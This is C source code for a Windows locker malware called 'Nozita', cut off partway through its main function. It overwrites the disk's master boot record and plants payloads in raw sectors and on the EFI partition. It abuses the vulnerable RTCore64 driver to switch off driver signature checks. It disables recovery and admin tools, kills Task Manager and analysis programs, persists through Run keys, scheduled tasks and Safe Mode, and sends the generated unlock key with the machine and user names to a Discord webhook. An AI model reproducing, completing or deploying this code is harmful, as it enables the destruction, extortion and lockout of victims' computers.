#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wininet.h>
#include <wincrypt.h>
#include <winternl.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdint.h>
#pragma comment(lib,"wininet.lib")
#pragma comment(lib,"crypt32.lib")
#pragma comment(lib,"shell32.lib")
#pragma comment(lib,"advapi32.lib")
#pragma comment(lib,"ntdll.lib")

#define WH "https://discord.com/api/webhooks/1563888663937556560/9fPW2T3O6vkvny5e-NLdALi5v467RsHhj5kNaKw3fUEBQ5HegOcJafGDT7n3wMFszcLT"
#define AN "NozitaGuard"
#define EN "nozita_system.exe"
#define RK "NozitaSystemLocker"
#define TN "NozitaSystemGuard"
#define HK "NozitaHash"
#define KL 16
#define DS L"NozitaDrv"
#define PL 128ULL
#define PS_SECTS 256ULL
#define BC RGB(10,10,20)
#define TC RGB(220,220,255)
#define RTCORE_R 0x80002048
#define RTCORE_W 0x8000204C
#define IOCTL_SET_MBR CTL_CODE(0x8000,0x800,METHOD_BUFFERED,FILE_WRITE_DATA)

static HHOOK     hKB = NULL;
static HWND      hW  = NULL, hE = NULL;
static HFONT     hFT = NULL, hFN = NULL;
static HINSTANCE hI;
static BOOLEAN   gU  = FALSE;

typedef NTSTATUS (WINAPI*pfL)(PUNICODE_STRING);

#pragma pack(push,1)
typedef struct { UINT8 p0[8]; UINT64 A; UINT8 p1[4]; UINT32 S; UINT64 V; UINT8 p2[4]; } RTMEM;
#pragma pack(pop)
typedef struct { ULONG r1,r2; PVOID B; ULONG Sz; CHAR N[256]; } SM2;
typedef struct { ULONG_PTR C; SM2 M[1]; } SMI;

/* ── Crypto ────────────────────────────────────────────────────────────────── */
static BOOL SHA256Hex(const char*in,char*o){
    HCRYPTPROV hp=0; HCRYPTHASH hh=0; BOOL ok=FALSE;
    if(!CryptAcquireContextA(&hp,NULL,NULL,PROV_RSA_AES,CRYPT_VERIFYCONTEXT)) return FALSE;
    if(!CryptCreateHash(hp,CALG_SHA_256,0,0,&hh)) goto d;
    if(!CryptHashData(hh,(BYTE*)in,(DWORD)strlen(in),0)) goto d;
    BYTE h[32]; DWORD hl=32;
    if(!CryptGetHashParam(hh,HP_HASHVAL,h,&hl,0)) goto d;
    for(int i=0;i<32;i++) sprintf(o+i*2,"%02x",h[i]); o[64]=0; ok=TRUE;
d:  if(hh) CryptDestroyHash(hh); if(hp) CryptReleaseContext(hp,0); return ok;
}
static void GenKey(char*o){
    const char c[]="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*";
    HCRYPTPROV hp;
    CryptAcquireContextA(&hp,NULL,NULL,PROV_RSA_AES,CRYPT_VERIFYCONTEXT);
    BYTE r[KL]; CryptGenRandom(hp,KL,r); CryptReleaseContext(hp,0);
    for(int i=0;i<KL;i++) o[i]=c[r[i]%(sizeof(c)-1)]; o[KL]=0;
}

/* ── Registry helpers ──────────────────────────────────────────────────────── */
static void RS(HKEY r,const char*s,const char*n,const char*v){HKEY k;if(RegCreateKeyExA(r,s,0,NULL,0,KEY_SET_VALUE,NULL,&k,NULL)==ERROR_SUCCESS){RegSetValueExA(k,n,0,REG_SZ,(BYTE*)v,(DWORD)strlen(v)+1);RegCloseKey(k);}}
static void RD(HKEY r,const char*s,const char*n,DWORD v){HKEY k;if(RegCreateKeyExA(r,s,0,NULL,0,KEY_SET_VALUE,NULL,&k,NULL)==ERROR_SUCCESS){RegSetValueExA(k,n,0,REG_DWORD,(BYTE*)&v,4);RegCloseKey(k);}}
static BOOL RR(HKEY r,const char*s,const char*n,char*o,DWORD z){HKEY k;if(RegOpenKeyExA(r,s,0,KEY_QUERY_VALUE,&k)!=ERROR_SUCCESS)return FALSE;BOOL ok=(RegQueryValueExA(k,n,NULL,NULL,(BYTE*)o,&z)==ERROR_SUCCESS);RegCloseKey(k);return ok;}

/* ── Webhook ───────────────────────────────────────────────────────────────── */
static void ParseURL(const char*u,char*h,int hs,char*p,int ps){
    const char*q=strstr(u,"://");if(!q){strncpy(h,"discord.com",hs);strncpy(p,"/",ps);return;}
    q+=3;const char*sl=strchr(q,'/');if(!sl){strncpy(h,q,hs);strncpy(p,"/",ps);return;}
    int hl=(int)(sl-q);if(hl>=hs)hl=hs-1;memcpy(h,q,hl);h[hl]=0;strncpy(p,sl,ps);p[ps-1]=0;
}
static void SendWH(const char*ti,const char*de,int co){
    char h[256],p[1024]; ParseURL(WH,h,sizeof(h),p,sizeof(p));
    HINTERNET hN=InternetOpenA("Mozilla/5.0",INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0); if(!hN)return;
    HINTERNET hC=InternetConnectA(hN,h,INTERNET_DEFAULT_HTTPS_PORT,NULL,NULL,INTERNET_SERVICE_HTTP,0,0);
    if(!hC){InternetCloseHandle(hN);return;}
    HINTERNET hR=HttpOpenRequestA(hC,"POST",p,NULL,NULL,NULL,INTERNET_FLAG_SECURE|INTERNET_FLAG_RELOAD|INTERNET_FLAG_NO_CACHE_WRITE,0);
    if(hR){char e[1024]={0};int j=0;for(int i=0;de[i]&&j<1022;i++){if(de[i]=='"'||de[i]=='\\')e[j++]='\\';e[j++]=de[i];}
        char b[2048];snprintf(b,sizeof(b),"{\"embeds\":[{\"title\":\"%s\",\"description\":\"%s\",\"color\":%d}]}",ti,e,co);
        const char*hd="Content-Type: application/json\r\n";
        HttpSendRequestA(hR,hd,(DWORD)strlen(hd),b,(DWORD)strlen(b));InternetCloseHandle(hR);}
    InternetCloseHandle(hC);InternetCloseHandle(hN);
}

/* ── Key init / verify ─────────────────────────────────────────────────────── */
static void InitKey(void){
    char ex[128]={0};
    if(RR(HKEY_LOCAL_MACHINE,"SOFTWARE\\"AN,HK,ex,sizeof(ex))&&strlen(ex)==64) return;
    char k[KL+1]; GenKey(k); char hx[65]={0}; SHA256Hex(k,hx);
    RS(HKEY_LOCAL_MACHINE,"SOFTWARE\\"AN,HK,hx);
    RS(HKEY_CURRENT_USER, "SOFTWARE\\"AN,HK,hx);
    char cn[256]="?",un[256]="?"; DWORD z=sizeof(cn);
    GetComputerNameA(cn,&z); z=sizeof(un); GetUserNameA(un,&z);
    char d[512]; snprintf(d,sizeof(d),"Machine: `%s` | User: `%s`\\n\\n**KEY: `%s`**",cn,un,k);
    SendWH("\U0001F512 Nozita-Locked|KEY",d,0xFF0000);
}
static BOOL VerifyKey(const char*in){
    char hx[65]={0}; if(!SHA256Hex(in,hx)) return FALSE;
    char st[128]={0};
    if(!RR(HKEY_LOCAL_MACHINE,"SOFTWARE\\"AN,HK,st,sizeof(st)))
        RR(HKEY_CURRENT_USER,"SOFTWARE\\"AN,HK,st,sizeof(st));
    return strcmp(hx,st)==0;
}

/* ── System lockdowns ──────────────────────────────────────────────────────── */
static void SetLock(BOOL en){
    DWORD v=en?1:0;
    const char*ps="Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
    const char*pe="Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer";
    RD(HKEY_CURRENT_USER,ps,"DisableTaskMgr",v);
    RD(HKEY_CURRENT_USER,ps,"DisableChangePassword",v);
    RD(HKEY_CURRENT_USER,ps,"DisableLockWorkstation",v);
    RD(HKEY_CURRENT_USER,ps,"NoLogoff",v);
    RD(HKEY_CURRENT_USER,ps,"DisableCAD",v);
    RD(HKEY_CURRENT_USER,ps,"DisableRegistryTools",v);
    RD(HKEY_CURRENT_USER,pe,"NoRun",v);
    RD(HKEY_CURRENT_USER,pe,"DisallowRun",v);
    if(en){
        const char*nr="Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun";
        RS(HKEY_CURRENT_USER,nr,"1","taskmgr.exe");   RS(HKEY_CURRENT_USER,nr,"2","regedit.exe");
        RS(HKEY_CURRENT_USER,nr,"3","cmd.exe");        RS(HKEY_CURRENT_USER,nr,"4","powershell.exe");
        RS(HKEY_CURRENT_USER,nr,"5","powershell_ise.exe"); RS(HKEY_CURRENT_USER,nr,"6","mmc.exe");
        RS(HKEY_CURRENT_USER,nr,"7","procexp.exe");    RS(HKEY_CURRENT_USER,nr,"8","procexp64.exe");
        RS(HKEY_CURRENT_USER,nr,"9","procmon.exe");    RS(HKEY_CURRENT_USER,nr,"10","autoruns.exe");
        system("bcdedit /set {default} recoveryenabled No >nul 2>&1");
        system("bcdedit /set {default} bootstatuspolicy ignoreallfailures >nul 2>&1");
    } else {
        RegDeleteKeyA(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun");
        system("bcdedit /set {default} recoveryenabled Yes >nul 2>&1");
        system("bcdedit /deletevalue {default} bootstatuspolicy >nul 2>&1");
    }
}

/* ── Persistence ───────────────────────────────────────────────────────────── */
static void SafeModePersist(const char*e){
    char c[MAX_PATH+64];
    snprintf(c,sizeof(c),"sc create NozitaSvc binPath= \"\\\"%s\\\"\" start= auto >nul 2>&1",e);
    system(c);
    RS(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\NozitaSvc","","Service");
    RS(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\NozitaSvc","","Service");
}
static void SetupPersist(void){
    char s[MAX_PATH]; GetModuleFileNameA(NULL,s,MAX_PATH);
    char d[MAX_PATH]; ExpandEnvironmentStringsA("%ProgramData%\\"AN,d,MAX_PATH);
    CreateDirectoryA(d,NULL);
    char t[MAX_PATH]; snprintf(t,sizeof(t),"%s\\"EN,d);
    if(_stricmp(s,t)!=0){CopyFileA(s,t,FALSE);SetFileAttributesA(t,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);}
    SetFileAttributesA(d,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);
    char rv[MAX_PATH+4]; snprintf(rv,sizeof(rv),"\"%s\"",t);
    RS(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",RK,rv);
    RS(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",RK,rv);
    char tc[600];
    snprintf(tc,sizeof(tc),"schtasks /create /tn \""TN"\" /tr \"\\\"%s\\\"\" /sc onlogon /rl highest /f >nul 2>&1",t);
    system(tc);
    SafeModePersist(t);
}

/* ── Self-destruct ─────────────────────────────────────────────────────────── */
static void SelfDestruct(void){
    gU=TRUE;
    if(hKB){UnhookWindowsHookEx(hKB);hKB=NULL;}
    SetLock(FALSE);
    HKEY k;
    if(RegOpenKeyExA(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&k)==ERROR_SUCCESS){RegDeleteValueA(k,RK);RegCloseKey(k);}
    if(RegOpenKeyExA(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&k)==ERROR_SUCCESS){RegDeleteValueA(k,RK);RegCloseKey(k);}
    system("schtasks /delete /tn \""TN"\" /f >nul 2>&1");
    system("sc delete NozitaSvc >nul 2>&1");
    RegDeleteKeyA(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\NozitaSvc");
    RegDeleteKeyA(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\NozitaSvc");
    if(RegOpenKeyExA(HKEY_LOCAL_MACHINE,"SOFTWARE\\"AN,0,KEY_SET_VALUE,&k)==ERROR_SUCCESS){RegDeleteValueA(k,HK);RegCloseKey(k);}
    system("start explorer.exe");
    char d[MAX_PATH],s[MAX_PATH],b[MAX_PATH];
    ExpandEnvironmentStringsA("%ProgramData%\\"AN,d,MAX_PATH);
    GetModuleFileNameA(NULL,s,MAX_PATH);
    ExpandEnvironmentStringsA("%TEMP%\\nz.bat",b,MAX_PATH);
    FILE*f=fopen(b,"w");
    if(f){
        fprintf(f,"@echo off\r\ntimeout /t 2 /nobreak >nul\r\n");
        fprintf(f,"attrib -h -s \"%s\"\r\nrmdir /s /q \"%s\"\r\n",d,d);
        fprintf(f,"del /f /q \"%s\"\r\ndel /f /q \"%%~f0\"\r\n",s);
        fclose(f);
        STARTUPINFOA si={sizeof(si)};si.dwFlags=STARTF_USESHOWWINDOW;si.wShowWindow=SW_HIDE;
        PROCESS_INFORMATION pi={0};char cm[MAX_PATH+32];
        snprintf(cm,sizeof(cm),"cmd.exe /c \"%s\"",b);
        CreateProcessA(NULL,cm,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
        if(pi.hProcess)CloseHandle(pi.hProcess);if(pi.hThread)CloseHandle(pi.hThread);
    }
    PostQuitMessage(0);
}

/* ── Process killer thread ─────────────────────────────────────────────────── */
static const char*KL2[]={"taskmgr.exe","regedit.exe","cmd.exe","powershell.exe",
    "powershell_ise.exe","procexp.exe","procexp64.exe","procmon.exe","procmon64.exe",
    "msconfig.exe","mmc.exe","autoruns.exe","autoruns64.exe","wireshark.exe",NULL};

static DWORD WINAPI KillerThread(LPVOID p){
    (void)p;
    while(!gU){
        HANDLE hs=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
        if(hs!=INVALID_HANDLE_VALUE){
            PROCESSENTRY32 pe={sizeof(pe)};
            if(Process32First(hs,&pe)) do{
                for(int i=0;KL2[i];i++) if(_stricmp(pe.szExeFile,KL2[i])==0){
                    HANDLE hp=OpenProcess(PROCESS_TERMINATE,FALSE,pe.th32ProcessID);
                    if(hp){TerminateProcess(hp,0);CloseHandle(hp);}
                }
            } while(Process32Next(hs,&pe));
            CloseHandle(hs);
        }
        if(hW&&!gU){ShowWindow(hW,SW_RESTORE);SetForegroundWindow(hW);}
        Sleep(500);
    }
    return 0;
}

/* ── Keyboard hook ─────────────────────────────────────────────────────────── */
LRESULT CALLBACK KBHook(int n,WPARAM w,LPARAM l){
    if(n>=0){
        KBDLLHOOKSTRUCT*k=(KBDLLHOOKSTRUCT*)l; DWORD vk=k->vkCode;
        BOOL al=(GetKeyState(VK_MENU)&0x8000)!=0;
        BOOL ct=(GetKeyState(VK_CONTROL)&0x8000)!=0;
        BOOL sh=(GetKeyState(VK_SHIFT)&0x8000)!=0;
        if((vk==VK_LWIN||vk==VK_RWIN)||(vk==VK_TAB&&al)||(vk==VK_ESCAPE&&ct)||
           (vk==VK_F4&&al)||(vk==VK_ESCAPE&&ct&&sh)||(vk==VK_DELETE&&ct&&al)){
            if(hW&&!gU){ShowWindow(hW,SW_RESTORE);SetForegroundWindow(hW);}
            return 1;
        }
    }
    return CallNextHookEx(hKB,n,w,l);
}

/* ── Window proc ───────────────────────────────────────────────────────────── */
LRESULT CALLBACK WndProc(HWND hw,UINT msg,WPARAM wp,LPARAM lp){
    static HBRUSH hB=NULL,hEB=NULL;
    switch(msg){
    case WM_CREATE:{
        hB=CreateSolidBrush(BC); hEB=CreateSolidBrush(RGB(25,8,45));
        hFT=CreateFontA(38,0,0,0,FW_BOLD,0,0,0,DEFAULT_CHARSET,OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,CLEARTYPE_QUALITY,DEFAULT_PITCH,"Segoe UI");
        hFN=CreateFontA(18,0,0,0,FW_NORMAL,0,0,0,DEFAULT_CHARSET,OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,CLEARTYPE_QUALITY,DEFAULT_PITCH,"Segoe UI");
        int sw=GetSystemMetrics(SM_CXSCREEN),sh=GetSystemMetrics(SM_CYSCREEN),cx=sw/2; HWND h;
        h=CreateWindowA("STATIC","NOZITA SYSTEM LOCKED",WS_VISIBLE|WS_CHILD|SS_CENTER,cx-320,sh/2-140,640,55,hw,NULL,hI,NULL); SendMessageA(h,WM_SETFONT,(WPARAM)hFT,TRUE);
        h=CreateWindowA("STATIC","เครื่องของคุณถูกล็อก\r\nใส่รหัสปลดล็อกที่ได้รับเท่านั้น",WS_VISIBLE|WS_CHILD|SS_CENTER,cx-260,sh/2-65,520,50,hw,NULL,hI,NULL); SendMessageA(h,WM_SETFONT,(WPARAM)hFN,TRUE);
        hE=CreateWindowA("EDIT","",WS_VISIBLE|WS_CHILD|WS_BORDER|ES_PASSWORD|ES_CENTER,cx-130,sh/2+5,260,38,hw,(HMENU)1,hI,NULL); SendMessageA(hE,WM_SETFONT,(WPARAM)hFN,TRUE);
        h=CreateWindowA("BUTTON","UNLOCK",WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,cx-75,sh/2+58,150,38,hw,(HMENU)2,hI,NULL); SendMessageA(h,WM_SETFONT,(WPARAM)hFN,TRUE);
        SetFocus(hE); break;
    }
    case WM_ERASEBKGND:{RECT r;GetClientRect(hw,&r);FillRect((HDC)wp,&r,hB);return 1;}
    case WM_CTLCOLORSTATIC: SetTextColor((HDC)wp,TC);SetBkColor((HDC)wp,BC);return(LRESULT)hB;
    case WM_CTLCOLOREDIT:   SetTextColor((HDC)wp,TC);SetBkColor((HDC)wp,RGB(25,8,45));return(LRESULT)hEB;
    case WM_COMMAND:
        if(LOWORD(wp)==2){
            char b[256]; GetWindowTextA(hE,b,sizeof(b));
            if(VerifyKey(b)){SendWH("\U0001F513 Nozita-Unlocked","OK",0x00FF00);SelfDestruct();}
            else{SendWH("\u26A0\uFE0F Nozita-Wrong","ผิด!",0xFF4400);MessageBoxA(hw,"Invalid key!","Access Denied",MB_OK|MB_ICONERROR);SetWindowTextA(hE,"");SetFocus(hE);}
        }
        break;
    case WM_CLOSE: ShowWindow(hw,SW_RESTORE);SetForegroundWindow(hw);return 0;
    case WM_DESTROY:
        if(hB)DeleteObject(hB);if(hEB)DeleteObject(hEB);
        if(hFT)DeleteObject(hFT);if(hFN)DeleteObject(hFN);
        PostQuitMessage(0); break;
    default: return DefWindowProcA(hw,msg,wp,lp);
    }
    return 0;
}

/* ── BYOVD ─────────────────────────────────────────────────────────────────── */
static void EnablePriv(LPCSTR p){
    HANDLE ht; OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES,&ht);
    TOKEN_PRIVILEGES tp={1}; LookupPrivilegeValueA(NULL,p,&tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(ht,FALSE,&tp,0,NULL,NULL); CloseHandle(ht);
}
static UINT64 RTR(HANDLE hd,UINT64 a,UINT32 s){RTMEM op={0},o={0};op.A=a;op.S=s;DWORD br;DeviceIoControl(hd,RTCORE_R,&op,sizeof(op),&o,sizeof(o),&br,NULL);return o.V;}
static void   RTW(HANDLE hd,UINT64 a,UINT32 s,UINT64 v){RTMEM op={0},o={0};op.A=a;op.S=s;op.V=v;DWORD br;DeviceIoControl(hd,RTCORE_W,&op,sizeof(op),&o,sizeof(o),&br,NULL);}
static UINT64 GetKModBase(const char*nm){
    ULONG n=0; NtQuerySystemInformation(11,NULL,0,&n);
    SMI*si=(SMI*)HeapAlloc(GetProcessHeap(),0,n);
    NtQuerySystemInformation(11,si,n,&n);
    for(ULONG i=0;i<si->C;i++){const char*p=si->M[i].N,*b=p;for(;*p;p++)if(*p=='\\'||*p=='/')b=p+1;if(_stricmp(b,nm)==0){UINT64 a=(UINT64)si->M[i].B;HeapFree(GetProcessHeap(),0,si);return a;}}
    HeapFree(GetProcessHeap(),0,si);return 0;
}
static DWORD FindCiOptRVA(void){
    char p[MAX_PATH]; GetWindowsDirectoryA(p,MAX_PATH); strcat_s(p,MAX_PATH,"\\System32\\ci.dll");
    HANDLE h=CreateFileA(p,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL); if(h==INVALID_HANDLE_VALUE)return 0;
    DWORD fsz=GetFileSize(h,NULL); BYTE*buf=(BYTE*)HeapAlloc(GetProcessHeap(),0,fsz); DWORD rd;
    ReadFile(h,buf,fsz,&rd,NULL); CloseHandle(h);
    PIMAGE_DOS_HEADER dos=(PIMAGE_DOS_HEADER)buf;
    PIMAGE_NT_HEADERS64 nt=(PIMAGE_NT_HEADERS64)(buf+dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec=IMAGE_FIRST_SECTION(nt); DWORD res=0;
    for(WORD i=0;i<nt->FileHeader.NumberOfSections&&!res;i++){
        if(strncmp((char*)sec[i].Name,".data",5)!=0) continue;
        BYTE*sd=buf+sec[i].PointerToRawData;
        for(DWORD j=0;j<sec[i].SizeOfRawData-6;j++)
            if(sd[j]==0x89&&sd[j+1]==0x0D){res=sec[i].VirtualAddress+j;break;}
    }
    HeapFree(GetProcessHeap(),0,buf); return res;
    // FILL: fallback known RVA for target Windows build if scan returns 0
}
static BOOL LoadRTC(LPCSTR path,HANDLE*out){
    SC_HANDLE sm=OpenSCManagerA(NULL,NULL,SC_MANAGER_CREATE_SERVICE); if(!sm)return FALSE;
    SC_HANDLE sv=CreateServiceA(sm,"RTCore64","RTCore64",SERVICE_START|SERVICE_STOP|DELETE,SERVICE_KERNEL_DRIVER,SERVICE_DEMAND_START,SERVICE_ERROR_NORMAL,path,NULL,NULL,NULL,NULL,NULL);
    if(!sv) sv=OpenServiceA(sm,"RTCore64",SERVICE_START|SERVICE_STOP|DELETE);
    if(!sv){CloseServiceHandle(sm);return FALSE;}
    StartServiceA(sv,0,NULL);
    *out=CreateFileA("\\\\.\\RTCore64",GENERIC_READ|GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL);
    CloseServiceHandle(sv);CloseServiceHandle(sm);return(*out!=INVALID_HANDLE_VALUE);
}
static void UnloadRTC(void){
    SC_HANDLE sm=OpenSCManagerA(NULL,NULL,SC_MANAGER_ALL_ACCESS); if(!sm)return;
    SC_HANDLE sv=OpenServiceA(sm,"RTCore64",SERVICE_STOP|DELETE);
    if(sv){SERVICE_STATUS ss;ControlService(sv,SERVICE_CONTROL_STOP,&ss);DeleteService(sv);CloseServiceHandle(sv);}
    CloseServiceHandle(sm);
}
static void RegDrv(LPCWSTR p,LPCWSTR s){
    WCHAR kp[512]; swprintf_s(kp,512,L"SYSTEM\\CurrentControlSet\\Services\\%ls",s);
    HKEY hk; RegCreateKeyExW(HKEY_LOCAL_MACHINE,kp,0,NULL,0,KEY_ALL_ACCESS,NULL,&hk,NULL);
    DWORD t=1,st=3,e=1;
    RegSetValueExW(hk,L"Type",0,REG_DWORD,(BYTE*)&t,4);
    RegSetValueExW(hk,L"Start",0,REG_DWORD,(BYTE*)&st,4);
    RegSetValueExW(hk,L"ErrorControl",0,REG_DWORD,(BYTE*)&e,4);
    RegSetValueExW(hk,L"ImagePath",0,REG_EXPAND_SZ,(BYTE*)p,(DWORD)((wcslen(p)+1)*2));
    RegCloseKey(hk);
}
static BOOL BypassDSE(LPCSTR rtc,LPCWSTR drv,LPCWSTR svc){
    pfL NtLoad=(pfL)GetProcAddress(GetModuleHandleA("ntdll.dll"),"NtLoadDriver");
    EnablePriv("SeLoadDriverPrivilege"); EnablePriv("SeSystemEnvironmentPrivilege");
    HANDLE hR; if(!LoadRTC(rtc,&hR)) return FALSE;
    UINT64 cb=GetKModBase("ci.dll"); if(!cb){CloseHandle(hR);return FALSE;}
    DWORD rv=FindCiOptRVA(); if(!rv){CloseHandle(hR);return FALSE;}
    UINT64 va=cb+rv; UINT32 ov=(UINT32)RTR(hR,va,4);
    RTW(hR,va,4,0);
    RegDrv(drv,svc);
    WCHAR sp[512]; swprintf_s(sp,512,L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\%ls",svc);
    UNICODE_STRING us; RtlInitUnicodeString(&us,sp);
    NTSTATUS st=NtLoad(&us);
    RTW(hR,va,4,ov); CloseHandle(hR); UnloadRTC();
    return NT_SUCCESS(st);
}

/* ── Disk helpers ──────────────────────────────────────────────────────────── */
static BYTE* ReadFileBuf(LPCSTR p,DWORD*sz){
    HANDLE h=CreateFileA(p,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(h==INVALID_HANDLE_VALUE)return NULL;
    *sz=GetFileSize(h,NULL); BYTE*b=(BYTE*)HeapAlloc(GetProcessHeap(),0,*sz); DWORD rd;
    ReadFile(h,b,*sz,&rd,NULL); CloseHandle(h); return b;
}
static BOOL DeployMBR(const BYTE*our){
    HANDLE hd=CreateFileA("\\\\.\\PhysicalDrive0",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
    if(hd==INVALID_HANDLE_VALUE)return FALSE;
    BYTE orig[512]={0}; DWORD br; LARGE_INTEGER off={0};
    SetFilePointerEx(hd,off,NULL,FILE_BEGIN); ReadFile(hd,orig,512,&br,NULL);
    off.QuadPart=62LL*512; SetFilePointerEx(hd,off,NULL,FILE_BEGIN); WriteFile(hd,orig,512,&br,NULL);
    BYTE nb[512]; memcpy(nb,our,512); memcpy(nb+446,orig+446,64);
    off.QuadPart=0; SetFilePointerEx(hd,off,NULL,FILE_BEGIN); WriteFile(hd,nb,512,&br,NULL);
    CloseHandle(hd); return TRUE;
}
static void StorePayload(const BYTE*pay,DWORD sz){
    HANDLE hd=CreateFileA("\\\\.\\PhysicalDrive0",GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
    if(hd==INVALID_HANDLE_VALUE)return;
    DWORD s=(sz+511)/512; if(s>PS_SECTS)s=(DWORD)PS_SECTS;
    BYTE*pb=(BYTE*)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,(SIZE_T)s*512);
    memcpy(pb,pay,min(sz,s*512));
    LARGE_INTEGER off; off.QuadPart=(LONGLONG)PL*512;
    SetFilePointerEx(hd,off,NULL,FILE_BEGIN); DWORD bw;
    WriteFile(hd,pb,(DWORD)(s*512),&bw,NULL);
    HeapFree(GetProcessHeap(),0,pb); CloseHandle(hd);
}
static void DeployESP(LPCSTR pay,LPCSTR efi){
    system("mountvol X: /S >nul 2>&1"); Sleep(800);
    CreateDirectoryA("X:\\EFI\\Boot",NULL); CreateDirectoryA("X:\\EFI\\Nozita",NULL);
    if(efi) CopyFileA(efi,"X:\\EFI\\Boot\\bootx64.efi",FALSE);
    CopyFileA(pay,"X:\\EFI\\Nozita\\nz_payload.exe",FALSE);
    SetFileAttributesA("X:\\EFI\\Nozita\\nz_payload.exe",FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);
    system("mountvol X: /D >nul 2>&1");
}
static void SendMBRToDrv(const BYTE*m){
    HANDLE h=CreateFileA("\\\\.\\NozitaGuard",GENERIC_READ|GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL);
    if(h==INVALID_HANDLE_VALUE)return;
    DWORD br; DeviceIoControl(h,IOCTL_SET_MBR,(PVOID)m,512,NULL,0,&br,NULL);
    CloseHandle(h);
}

/* ── WinMain ───────────────────────────────────────────────────────────────── */
int WINAPI WinMain(HINSTANCE hi,HINSTANCE hp,LPSTR lp,int ns){
    (void)hp;(void)lp;(void)ns; hI=hi;

    HANDLE hm=CreateMutexA(NULL,TRUE,"Global\\NozitaLockerMutex");
    if(GetLastError()==ERROR_ALREADY_EXISTS){CloseHandle(hm);return 0;}

    // ── Installer phase ──────────────────────────────────────────────────
    char sd[MAX_PATH]; GetModuleFileNameA(NULL,sd,MAX_PATH);
    char*sl=strrchr(sd,'\\'); if(sl) *(sl+1)=0;

    char mp[MAX_PATH],dp[MAX_PATH],rp[MAX_PATH],pp[MAX_PATH],ep[MAX_PATH];
    snprintf(mp,MAX_PATH,"%smbr.bin",sd);
    snprintf(dp,MAX_PATH,"%snozita_drv.sys",sd);
    snprintf(rp,MAX_PATH,"%sRTCore64.sys",sd);
    snprintf(pp,MAX_PATH,"%spayload.exe",sd);
    snprintf(ep,MAX_PATH,"%sbootx64.efi",sd);

    DWORD ms=0,ps=0;
    BYTE*mb=ReadFileBuf(mp,&ms);
    BYTE*pb=ReadFileBuf(pp,&ps);

    if(mb&&ms>=512) DeployMBR(mb);
    if(pb) StorePayload(pb,ps);
    DeployESP(pp,ep);

    char xd[MAX_PATH],dd[MAX_PATH];
    ExpandEnvironmentStringsA("%ProgramData%\\"AN,dd,MAX_PATH);
    CreateDirectoryA(dd,NULL);
    snprintf(xd,MAX_PATH,"%s\\nozita_drv.sys",dd);
    CopyFileA(dp,xd,FALSE);
    SetFileAttributesA(xd,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);
    wchar_t wd[MAX_PATH]; MultiByteToWideChar(CP_ACP,0,xd,-1,wd,MAX_PATH);
    BOOL dok=BypassDSE(rp,wd,DS);
    if(dok&&mb) SendMBRToDrv(mb);

    if(mb) HeapFree(GetProcessHeap(),0,mb);
    if(pb) HeapFree(GetProcessHeap(),0,pb);

    // ── Locker phase ─────────────────────────────────────────────────────
    SetLock(TRUE);
    system("taskkill /f /im explorer.exe >nul 2>&1");
    SetupPersist();
    InitKey();
    CreateThread(NULL,0,KillerThread,NULL,0,NULL);

    WNDCLASSA wc={0};
    wc.lpfnWndProc=WndProc; wc.hInstance=hi;
    wc.lpszClassName="NLC"; wc.hCursor=LoadCursor(NULL,IDC_ARROW);
    RegisterClassA(&wc);

    int sw=GetSystemMetrics(SM_CXSCREEN),sh=GetSystemMetrics(SM_CYSCREEN);
    HWND hw=CreateWindowExA(WS_EX_TOPMOST|WS_EX_TOOLWINDOW,"NLC",AN,
        WS_POPUP|WS_VISIBLE,0,0,sw,sh,NULL,NULL,hi,NULL);
    hW=hw;
    hKB=SetWindowsHookExA(WH_KEYBOARD_LL,KBHook,hi,0);

    MSG msg;
